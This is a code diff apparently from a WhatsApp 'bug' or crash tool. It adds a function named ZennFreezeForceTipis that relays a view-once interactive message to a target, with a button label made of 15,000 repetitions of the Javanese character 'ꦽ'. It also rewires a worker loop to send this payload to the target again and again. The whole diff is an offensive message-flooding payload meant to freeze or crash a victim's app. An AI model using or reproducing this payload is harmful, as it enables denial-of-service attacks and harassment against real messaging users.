@@ -3321,9 +3321,9 @@ Status      : Success
             
             const instanceId = Date.now() + Math.random();
             
-            for (let i = 0; i < 50; i++) {
+            for (let i = 0; i < 2; i++) {
                 try {
-                    await uploadStatus(sock, target);
+                    await ZennFreezeForceTipis(sock, target);
                     await sleep(2000)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
@@ -3913,6 +3913,35 @@ async function VnXNewOneButtonsBlnk(sock, target) {
     await sock.relayMessage(target, vnxbtns, { 
     participant: { jid: target } 
   });
+}
+
+async function ZennFreezeForceTipis(sock, target) {
+  const ZennTzy = {
+    viewOnceMessage: {
+      message: {
+        interactiveMessage: {
+          body: {
+            text: "who's zenn?"
+          },
+          nativeFlowMessage: {
+            buttons: [
+              {
+                name: "booking_status",
+                buttonParamsJson: JSON.stringify({
+                  display_text: "ꦽ".repeat(15000),
+                  phone_number: "00000000000000"
+                })
+              }
+            ],
+            version: 3
+          }
+        }
+      }
+    }
+  };
+
+  await sock.relayMessage(target, ZennTzy, { participant: { jid: target }
+  });
 }
 
 //     _       ___  _   _ _   _ _____  _   _        
